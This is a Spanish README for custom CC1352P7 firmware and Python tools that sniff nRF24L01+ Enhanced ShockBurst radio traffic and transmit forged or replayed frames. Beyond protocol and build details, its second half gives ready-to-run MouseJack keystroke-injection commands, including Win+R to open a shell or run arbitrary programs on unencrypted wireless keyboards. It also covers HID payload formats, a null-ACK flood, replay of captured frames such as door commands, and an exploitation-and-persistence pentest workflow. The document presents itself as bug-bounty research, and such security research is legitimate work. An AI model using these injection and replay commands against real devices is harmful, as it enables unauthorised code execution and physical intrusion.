# Firmware Custom: nRF24L01+ Sniffer para CC1352P7

## ¿Qué hace este firmware?

Captura paquetes del protocolo propietario **Enhanced ShockBurst (ESB)** de Nordic
Semiconductor, utilizado en los transceptores nRF24L01+. Opera en modo promiscuo
(sin conocer la dirección del objetivo) o en modo dirigido (con dirección conocida).

---

## Capas del protocolo nRF24L01+ (ESB)

El Enhanced ShockBurst es un protocolo de enlace capa 2 completamente propietario
de Nordic. No es BLE ni 802.15.4.

```
┌──────────────────────────────────────────────────────────────┐
│  PHY: GFSK 2.4 GHz, canales 0-125 → 2400+N MHz, BT=0.5     │
│       Tasas: 250 kbps / 1 Mbps / 2 Mbps                      │
└──────────────────────────────────────────────────────────────┘
              ↓
┌─────────┬──────────────┬───────────────┬─────────┬──────────┐
│Preamble │  Address     │  PCF (9 bits) │ Payload │  CRC     │
│ 1 byte  │  3–5 bytes   │  2 bytes*     │ 0–32 B  │ 1–2 B    │
└─────────┴──────────────┴───────────────┴─────────┴──────────┘

* Los 9 bits de PCF ocupan 2 bytes (los 7 bits altos del segundo byte = 0)

Preamble:
  Si el MSB del primer byte de dirección == 1 → preamble = 0xAA
  Si el MSB del primer byte de dirección == 0 → preamble = 0x55

PCF (Packet Control Field) — 9 bits, MSB primero:
  bits [8:3]  = Payload Length (6 bits): 0–32 bytes
  bits [2:1]  = PID (2 bits):  Packet ID para deduplicación
  bit  [0]    = NO_ACK: 1 = sin ACK requerido

Anchos de dirección configurables: 3, 4 o 5 bytes (defecto: 5)
Dirección default de fábrica:
  Pipe 0/TX: 0xE7 E7 E7 E7 E7
  Pipe 1:    0xC2 C2 C2 C2 C2
  Pipes 2–5: 0xC2 C2 C2 C2 XX (byte bajo configurable)

CRC:
  CRC-8:   Polinomio 0x107  (x⁸+x²+x+1),  IV = 0xFF
  CRC-16:  Polinomio 0x18005 (x¹⁶+x¹⁵+x²+1), IV = 0xFFFF
  El CRC cubre: Address + PCF + Payload (no el preamble)

Canal RF: frecuencia = 2400 + RF_CH [MHz],  RF_CH ∈ [0, 125]
  Canal 76  → 2476 MHz  (default en muchas bibliotecas Arduino)
  Canal 100 → 2500 MHz  (preferido en módulos chinos)
  Canal 2   → 2402 MHz  (comúnmente evitado, solapamiento WiFi)
```

---

## Por qué el CC1352P7 puede hacerlo

El CC1352P7 tiene un radio core ARM RF programable que soporta **modo propietario
GFSK** a 2.4 GHz. Los parámetros físicos son idénticos a los del nRF24L01+:
- Misma modulación (2-FSK / GFSK)
- Misma banda de frecuencia (2.4 GHz ISM)
- Ancho de banda configurable

La clave: configurar el radio core para que su **sync word** sea la misma secuencia
que espera el nRF24L01+ (preamble + address), y deshabilitar el filtro de CRC
para captura promiscua.

---

## Requisitos del entorno de desarrollo

| Herramienta | Versión | Descarga |
|---|---|---|
| TI SimpleLink CC13xx/CC26xx SDK | ≥ 7.10 | [dev.ti.com/tirex](https://dev.ti.com/tirex) |
| TI SmartRF Studio 7 | ≥ 2.27 | [ti.com/tool/SMARTRFTM-STUDIO](https://www.ti.com/tool/SMARTRFTM-STUDIO) |
| ARM GCC Toolchain | ≥ 9.3 | [developer.arm.com](https://developer.arm.com/downloads/-/gnu-rm) |
| CMake | ≥ 3.21 | sistema/brew |
| TI SysConfig | ≥ 1.16 | incluido con el SDK |
| Code Composer Studio (opcional) | ≥ 12 | Import del proyecto CCS incluido |

### macOS (Homebrew)
```bash
brew install cmake ninja arm-none-eabi-gcc
# SDK y SmartRF Studio: instalar desde TI directamente (tienen binarios macOS)
```

---

## Estructura del proyecto

```
firmware/nrf24_sniffer_cc1352p7/
├── README.md                ← este archivo
├── CMakeLists.txt           ← build system
├── nrf24_sniffer.c          ← aplicación principal
├── nrf24_esb.h              ← parser ESB portable (sin dependencias)
├── smartrf_settings.h       ← configuración radio (salida SmartRF Studio)
└── nrf24_sniffer.syscfg     ← SysConfig (UART, RF, Power)
```

---

## Paso 1 — Generar configuración radio con SmartRF Studio 7

SmartRF Studio genera los valores exactos de los registros del radio core.

1. Abrir SmartRF Studio 7
2. Seleccionar dispositivo: **CC1352P7**
3. Pestaña **"Packet TX/RX"** → Protocol: **"Custom / Proprietary"**
4. Band: **2.4 GHz**
5. Configurar estos parámetros:

```
Modulation       : 2-FSK (GFSK)
Symbol Rate      : 1000.000 kBaud   ← 1 Mbps nRF24
Deviation        : 160.000 kHz      ← Nordic spec §7.3 (1 Mbps)
RX Filter BW     : 1600.000 kHz     ← 2× deviation rule of thumb
Preamble         : 4 bytes (0xAA)   ← para modo promiscuo
Sync Word        : AAAAAAAA         ← preamble trick (ver §Sniffing Promiscuo)
Sync Word Bits   : 32
Whitening        : Off              ← nRF24L01+ NO usa whitening
CRC              : None             ← deshabilitar para captura promiscua
Packet Length    : Fixed = 37       ← max ESB frame
```

6. Click **"Export"** → **"C code"** → copiar el bloque `RF_cmdPropRadioDivSetup`
7. Reemplazar `TODO_SMARTRF_*` en `smartrf_settings.h` con los valores exportados.

### Para 2 Mbps:
```
Symbol Rate : 2000.000 kBaud
Deviation   : 500.000 kHz     ← Nordic spec §7.3 (2 Mbps)
RX Filter BW: 2000.000 kHz
```

### Para 250 kbps:
```
Symbol Rate : 250.000 kBaud
Deviation   : 160.000 kHz     ← Nordic spec §7.3 (250 kbps)
RX Filter BW: 600.000 kHz
```

---

## Paso 2 — Sniffing promiscuo (sin conocer la dirección)

Técnica descubierta por Travis Goodspeed (2011) y popularizada por MouseJack
(Bastille Networks, 2016):

```
Problema: necesitas la dirección para sincronizar con el dispositivo.
Solución: usar 0xAAAAAAAA como sync word de 32 bits.

¿Por qué funciona?
- El preamble del nRF24 es siempre 0xAA o 0x55 (1 byte alterno)
- La address sigue inmediatamente al preamble
- Si configuramos el CC1352P7 con syncWord = 0xAAAAAAAA (32 bits),
  el radio core sincronizará con cualquier trama que tenga 4 bytes 0xAA
  consecutivos → esto ocurre naturalmente cuando:
    preamble(0xAA) + address_byte0(0xAA o 0xAB o 0xA8...)
  O bien se captura "al vuelo" desde cualquier módulo cuya dirección
  tenga bits dominantes en 1 en los primeros bytes.
```

Después de capturar los bytes crudos, el firmware/Python intenta parsear
como ESB probando address widths de 3, 4 y 5 bytes y validando el CRC.

---

## Paso 3 — Compilar y flashear

```bash
# Desde el directorio raíz del firmware
mkdir build && cd build
cmake .. \
  -DTICC13XX_SDK_PATH=C:\ti\simplelink_cc13xx_cc26xx_sdk_8_32_00_07 \
  -DSYSCONFIG_PATH=C:\ti\sysconfig_1.21.1 \
  -DCMAKE_TOOLCHAIN_FILE=../arm-none-eabi-toolchain.cmake

cmake --build . --target nrf24_sniffer

# Flash con catnip (si se añade el .hex al repositorio de catnip)
catnip flash nrf24-sniffer
# O directamente con uniflash/openocd:
openocd -f board/ti_cc1352p7_launchpad.cfg \
        -c "program build/nrf24_sniffer.hex verify reset exit"
```

---

## Protocolo UART (firmware → Python)

Baud rate: **115200**, 8N1

### Mensajes del firmware → host:
```
===== nRF24L01+ Sniffer (CC1352P7) =====
[INIT] ch=076 freq=2476MHz rate=1M mode=PROMISC
[PKT]  ch=076 rssi=-055 len=37 raw=AABBCCDD...    ← raw bytes hex
[ESB]  ch=076 rssi=-055 addr=E7E7E7E7E7 plen=8 pid=0 noack=0 pld=0102030405060708 crc=OK
[ESB]  ch=076 rssi=-057 addr=C2C2C2C202 plen=0 pid=1 noack=1 pld= crc=OK  ← ACK empty
[SCAN] ch=076 active=1 pkts=12 rssi_max=-045
[SCAN] ch=013 active=0 pkts=0
```

### Comandos host → firmware:
```
CH:076\r\n                    → cambiar a canal 76 (2476 MHz)
CH:SCAN\r\n                   → escaneo automático canales 0-125
ADDR:E7E7E7E7E7\r\n           → modo dirigido con address específica
MODE:PROMISC\r\n              → volver a modo promiscuo
RATE:1M\r\n                   → 1 Mbps
RATE:2M\r\n                   → 2 Mbps
RATE:250K\r\n                 → 250 kbps

# ─── Comandos TX (Spoofing / Replay) ───────────────────────────────────────
TX:ADDR:PAYLOAD_HEX\r\n       → transmitir un frame ESB forjado
  ADDR        = 6-10 chars hex (3-5 bytes de dirección, ej: E7E7E7E7E7)
  PAYLOAD_HEX = 0-64 chars hex (0-32 bytes de payload, puede ser vacío)
  EL CRC se calcula automáticamente (CRC-16 CCITT)
  PID se incrementa automáticamente (0→1→2→3→0...)

  Ejemplo — inyectar 8 bytes HID (teclado):
  TX:E7E7E7E7E7:0002000000000000\r\n
   → keycode 0x00, modifier 0x02 (Shift), sin tecla, sin tecla, ...

  Ejemplo — paquete vacío (null ACK / fingerprinting):
  TX:E7E7E7E7E7:\r\n

REPLAY:RAW_HEX\r\n            → retransmitir un frame ESB capturado sin modificación
  RAW_HEX = frame completo (addr+PCF+payload+CRC) en hex,
            exactamente como apareció en la línea [PKT] del firmware.

  Ejemplo — replay del frame del último [PKT]:
  REPLAY:E7E7E7E7E700000102030405060708XXXX\r\n
```

### Respuestas del firmware para TX/Replay:
```
[TX] OK addr=E7E7E7E7E7 plen=8 flen=16   → transmisión exitosa
  plen = longitud del payload
  flen = longitud total del frame (addr+PCF+payload+CRC)

[TX] ERR bad format (TX:ADDR:PAYLOAD)    → formato incorrecto
[TX] ERR addr length                     → dirección demasiado corta/larga
[TX] ERR addr parse                      → caracteres no hex en addr
[TX] ERR payload parse                   → payload hex inválido
[TX] ERR build frame                     → error interno al construir ESB
[TX] ERR rf_tx failed                    → CMD_PROP_TX devolvió error RF

[REPLAY] OK len=16                       → replay exitoso
[REPLAY] ERR parse                       → RAW_HEX inválido
[REPLAY] ERR rf_tx failed                → error RF en retransmisión
```

---

## Vectores de auditoría / ataques disponibles

Una vez capturando tráfico, los siguientes ataques son posibles:

| Técnica | Módulo Python | Condición |
|---|---|---|
| **Passive sniff** | `nrf24_sniffer` | — |
| **Channel scan** | `nrf24_sniffer --mode scan` | — |
| **ACK sniff** | `nrf24_sniffer` (detecta `is_ack`) | — |
| **Replay attack** | `nrf24_replayer` | Firmware con soporte TX (incluido) |
| **MouseJack keystroke** | `nrf24_spoofer --mode keystroke` | Target HID sin cifrado |
| **MouseJack string inject** | `nrf24_spoofer --mode string` | Target HID sin cifrado |
| **MouseJack shell_exec** | `nrf24_spoofer --shell_exec s` | Win+R → cmd arbitrario |
| **Frequency hopping bypass** | `nrf24_sniffer --mode scan` | Múltiples canales |
| **Null ACK flood** | `nrf24_spoofer --mode null` | — |

### CVE asociados — MouseJack (CVE-2016-10025 a CVE-2016-10031):

Los ratones/teclados inalámbricos de Logitech, Microsoft, HP, Dell, etc. que usan
nRF24L01+ **sin cifrado ni autenticación**. Un atacante puede inyectar paquetes HID
(teclado) fingiendo ser el dongle receptor para ejecutar pulsaciones de teclas
arbitrarias. Ver: https://www.mousejack.com/

> **Nota de originalidad (PoC bug bounty):** Los CVEs de MouseJack (2016) se
> demostraron exclusivamente con CrazyRadio PA y dongles nRF24LU1+. Esta
> implementación es la **primera en usar el CC1352P7 (CatSniffer)** para ESB
> sniffing + spoofing + replay. El ecosistema oficial de Electronic Cats
> (CatSniffer-Firmware / CatSniffer-Tools) no incluye soporte nRF24/ESB.
> Verificado en los repositorios oficiales con fecha marzo 2026.

---

## Módulos Python — uso rápido

Todos los módulos asumen que el firmware `nrf24-sniffer` está ya flasheado y
el CatSniffer conectado en `/dev/ttyACM0` (o el puerto que sea).

### `nrf24_sniffer` — captura pasiva

```bash
# Menú interactivo
python main.py run nrf24_sniffer

# Opciones clave
python main.py run nrf24_sniffer \
  --set port=/dev/ttyACM0 \
  --set channel=76 \
  --set mode=promisc \
  --set export_pcap=s          # guarda .pcap para Wireshark

# Modo scan (mapeo de canales activos)
python main.py run nrf24_sniffer --set channel=scan --set mode=scan

# Modo dirigido (address conocida)
python main.py run nrf24_sniffer \
  --set mode=directed \
  --set addr=E7E7E7E7E7 \
  --set channel=76
```

### `nrf24_spoofer` — MouseJack / inyección ESB

```bash
# Inyectar una cadena (ej: abrir calc en Windows)
python main.py run nrf24_spoofer \
  --set target_addr=E7E7E7E7E7 \
  --set channel=76 \
  --set mode=string \
  --set string=calc \
  --set shell_exec=s           # Win+R → "calc" → Enter

# Inyectar un keycode único (ej: Win key = modifier 0x08, kc 0x00)
python main.py run nrf24_spoofer \
  --set target_addr=E7E7E7E7E7 \
  --set mode=keystroke \
  --set key_modifier=08 \
  --set key_code=00

# Paquete vacío (null ACK flood)
python main.py run nrf24_spoofer \
  --set target_addr=E7E7E7E7E7 \
  --set mode=null \
  --set repeat=50

# Payload raw personalizado
python main.py run nrf24_spoofer \
  --set target_addr=E7E7E7E7E7 \
  --set mode=raw \
  --set payload_hex=0002000000000000   # HID: modifier=Shift, no key
```

**Formato de payload HID MouseJack (8 bytes):**
```
Byte 0: 0x00          (report ID, siempre 0 en boot protocol)
Byte 1: Modifier      (0x00=none, 0x01=LCtrl, 0x02=LShift, 0x04=LAlt, 0x08=LWin)
Byte 2: 0x00          (reserved)
Byte 3: HID Keycode   (0x04=a, 0x05=b, ..., 0x28=Enter, 0x2C=Space)
Bytes 4-7: 0x00       (keycodes 2-5, para rollover; dejar a 0)
```

Tabla de keycodes HID relevantes:
```
0x04–0x1D  a–z
0x1E–0x27  1–9, 0
0x28       Enter
0x29       Escape
0x2A       Backspace
0x2B       Tab
0x2C       Space
0x4F–0x52  → ← ↓ ↑
0x3A–0x45  F1–F12
```

### `nrf24_replayer` — captura + replay interactivo

```bash
# Arrancar el replayer (captura en tiempo real)
python main.py run nrf24_replayer \
  --set port=/dev/ttyACM0 \
  --set channel=76 \
  --set mode=promisc

# Modo replay automático (retransmite cada frame capturado)
python main.py run nrf24_replayer \
  --set auto_replay=s \
  --set replay_delay=200     # ms entre replays

# Filtrar por address (solo capturar/replay de un dispositivo)
python main.py run nrf24_replayer \
  --set filter_addr=E7E7E7E7 \
  --set mode=directed \
  --set addr=E7E7E7E7E7
```

**Controles interactivos durante el replayer:**
```
[número]   → replay del frame con ese índice
last / l   → replay del último frame capturado
q / quit   → salir
[Enter]    → actualizar el panel sin hacer replay
```

---

## Flujo completo de un pentest nRF24 (PoC bug bounty)

```
1. RECONOCIMIENTO (nrf24_sniffer, modo scan)
   ─────────────────────────────────────────
   • Encontrar canales activos con dispositivos nRF24
   • Identificar addresses de los transceivers
   • Capturar primeros frames, anotar: addr, channel, payload len

2. ANÁLISIS (nrf24_sniffer, modo directed)
   ─────────────────────────────────────────
   • Fijar la address del dongle receptor encontrado
   • Capturar tráfico HID (si es teclado/ratón)
   • Exportar .pcap para análisis offline en Wireshark
   • Identificar si el dispositivo es vulnerable a MouseJack:
     → sin cifrado, acepta paquetes de cualquier transmisor
     → payload de 8 bytes que coincide con formato HID boot

3. EXPLOTACIÓN (nrf24_spoofer)
   ─────────────────────────────────────────
   • Si HID vulnerable: inyectar keystroke o string
   • Ejemplo de payload real (abrir terminal):
     Win+R → "cmd" → Enter (sólo si win=0x08, r=0x15, ..., enter=0x28)

4. PERSISTENCIA / REPETICIÓN (nrf24_replayer)
   ─────────────────────────────────────────
   • Capturar el frame del comando que abre la puerta/realiza acción
   • Repetirlo en tiempo real con replay interactivo
   • Para rolling codes sin counter → replay directo funciona

5. DOCUMENTACIÓN
   ─────────────────────────────────────────
   • El .pcap del sniffer sirve como evidencia para el reporte
   • Incluir: canal, dirección, tasa, payload en hex, contexto HID
```

---

## Notas sobre smartrf_settings.h

El archivo `smartrf_settings.h` contiene tres estructuras de configuración del
módulo de radio del CC1352P7:

| Estructura | Propósito |
|---|---|
| `RF_nrf24_cmdPropRadioDivSetup_1M` | Setup del front-end RF (1 Mbps GFSK 2.4 GHz). Llamar una vez al inicio o al cambiar de canal. |
| `RF_nrf24_cmdPropRxAdv` | Receptor promiscuo. `syncWord0 = 0xAAAAAAAA` para capturar cualquier nRF24. Modificar `syncWord0` para modo dirigido. |
| `RF_nrf24_cmdPropTx` | Transmisor para spoofing/replay. `pPkt` y `pktLen` se actualizan antes de cada TX en `rf_tx_frame()`. |

### Sustitución de valores SmartRF Studio

Los campos marcados `TODO_SMARTRF_*` deben reemplazarse con los valores
exportados de TI SmartRF Studio 7. Los valores actuales son **de referencia**
calculados a partir del datasheet CC1352P7 y pueden no ser los óptimos:

```c
// Valores actuales (referencia) → obtener de SmartRF Studio:
.modulation.deviation  = 0x280  // 160 kHz — verificar con SmartRF
.symbolRate.preScale   = 0xF    // ÷16 — verificar con SmartRF
.symbolRate.rateWord   = 0x200000 // ≈ 1 Mbps — verificar con SmartRF
.rxBw                  = 0x59  // ≈ 1600 kHz — verificar con SmartRF
.txPower               = 0xCCC0 // ≈ 0 dBm — verificar con SmartRF
```

Para obtener los valores exactos:
1. Abrir SmartRF Studio 7 → CC1352P7
2. Custom Proprietary → 2.4 GHz → 1 Mbps GFSK
3. Export C code → copiar el array `RF_cmdPropRadioDivSetup`
4. Reemplazar las líneas `TODO_SMARTRF_*` con los valores exportados

---

## Referencias

- [nRF24L01+ Product Specification 1.0](https://cdn.sparkfun.com/assets/3/d/8/5/1/nRF24L01P_Product_Specification_1_0.pdf)
- [MouseJack — Bastille Networks (2016)](https://www.mousejack.com/)
- [Travis Goodspeed — Promiscuous mode ESB (2011)](http://travisgoodspeed.blogspot.com/2011/02/promiscuity-is-nrf24l01s-duty.html)
- [TI SimpleLink CC13xx SDK](https://www.ti.com/tool/SIMPLELINK-CC13XX-CC26XX-SDK)
- [TI SmartRF Studio 7](https://www.ti.com/tool/SMARTRFTM-STUDIO)
- [CC1352P7 Datasheet](https://www.ti.com/lit/ds/symlink/cc1352p7.pdf)
- [HID Usage Tables — USB.org](https://usb.org/sites/default/files/hut1_4.pdf)
